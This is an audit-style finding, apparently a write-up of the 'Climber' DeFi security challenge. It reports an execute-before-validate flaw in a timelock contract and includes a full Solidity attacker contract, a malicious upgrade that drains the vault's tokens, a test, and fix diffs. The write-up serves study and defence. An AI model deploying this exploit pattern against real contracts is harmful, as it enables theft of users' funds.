## Critical Severity Issues

### [C-1] Execute-Before-Validate Vulnerability in `ClimberTimelock::execute` function

**Description:** The `ClimberTimelock` contract is responsible for scheduling operations which can be executed by anyone after a `1 hour` delay by invoking the `execute` function. The `execute` function has a critical vulnerability, which does not check whether a specific operation is queued or not before making an external call. A malicious actor can take advantage of this vulnerability and exploit the entire protocol to drain all the funds.

```javascript

function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements,  bytes32 salt
    ) external payable {
        if (targets.length <= MIN_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);


        for (uint8 i = 0; i < targets.length; ++i) {
@>           targets[i].functionCallWithValue(dataElements[i], values[i]);
        }


@>       if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }

        operations[id].executed = true;
    }
```

**Impact:** An attacker can exploit this vulnerability to acquire the entire protocol funds.

**Proof of Concept:**

1. Attacker calls the `execute` function
2. Pass encoded parameters which make external calls
3. Under the hood, external calls update:
   3.1 `PROPOSER_ROLE` using `grantRole(bytes32,address)`
   3.2 `updateDelay(uint64)`
   3.3 `transferOwnership(address)`
   3.4 `scheduleOperation()`

4. Upgrades the implementation to a malicious contract
5. Calls the `drainFunds` function in the malicious contract

```javascript
Attacker contract:

contract Attack {
    ClimberVault vault; 
    ClimberTimelock timelock;
    address token;
    address recovery;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor( ClimberVault _vault, ClimberTimelock _timelock, address _token, address _recovery) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
        salt = bytes32(0);
    }

    function attack() external {
        address maliciousImpl = address(new MaliciousVault());

        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        // 1. Grant PROPOSER_ROLE to this contract
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        // 2. Update delay to 0
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        // 3. Make timelock transfer ownership of vault to this contract
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        // 4. Schedule this operation
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("scheduleOperation()");

        // 5. Execute 
        timelock.execute(targets, values, dataElements, salt);

        // 6. Upgrade
        vault.upgradeToAndCall(maliciousImpl, "");

        // Drain the funds
        MaliciousVault(address(vault)).drainFunds(token, recovery);
    }

    function scheduleOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;
    constructor() {
        _disableInitializers();
    }

    function drainFunds(address tokenAddress, address receiver) external {
        ERC20 token = ERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));


        SafeTransferLib.safeTransfer(token, receiver, balance);
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}


Test Case:

 function test_Attack() public {
        address recovery = makeAddr("recovery Address");
        Attack attacker = new Attack(
            getProxy(),
            climberTimelock,
            address(token),
            recovery
        );
        attacker.attack();

        token.balanceOf(address(erc1967Proxy));
        token.balanceOf(recovery);
    }

```

**Recommended Mitigation:**

1. First validate the operation, then make an external call.

```diff

function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements,  bytes32 salt
    ) external payable {
        if (targets.length <= MIN_TARGETS) {
            revert InvalidTargetsCount();
        }

        if (targets.length != values.length) {
            revert InvalidValuesCount();
        }

        if (targets.length != dataElements.length) {
            revert InvalidDataElementsCount();
        }

        bytes32 id = getOperationId(targets, values, dataElements, salt);


-        for (uint8 i = 0; i < targets.length; ++i) {
-           targets[i].functionCallWithValue(dataElements[i], values[i]);
-        }


-       if (getOperationState(id) != OperationState.ReadyForExecution) {
-           revert NotReadyForExecution(id);
-        }


+       if (getOperationState(id) != OperationState.ReadyForExecution) {
+           revert NotReadyForExecution(id);
+        }


+        for (uint8 i = 0; i < targets.length; ++i) {
+           targets[i].functionCallWithValue(dataElements[i], values[i]);
+        }

        operations[id].executed = true;
    }

```

2. Add access control to the `updateDelay` function.

```diff

-  function updateDelay(uint64 newDelay) external {
+  function updateDelay(uint64 newDelay) external onlyRole(PROPOSER_ROLE) {
        if (msg.sender != address(this)) {
            revert CallerNotTimelock();
        }

        if (newDelay > MAX_DELAY) {
            revert NewDelayAboveMax();
        }

        delay = newDelay;
    }

```
